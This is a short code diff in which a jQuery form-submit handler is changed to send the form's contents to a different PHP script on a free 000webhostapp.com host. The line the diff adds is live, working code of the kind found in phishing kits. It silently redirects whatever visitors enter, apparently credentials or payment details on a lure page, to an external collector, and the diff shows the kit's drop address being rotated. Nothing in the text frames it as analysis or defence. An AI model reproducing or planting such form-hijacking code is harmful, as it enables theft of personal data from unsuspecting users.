@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://come-on-duaribuduaempat.000webhostapp.com/royoan/job.php");
+  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/iuran.php");
 });
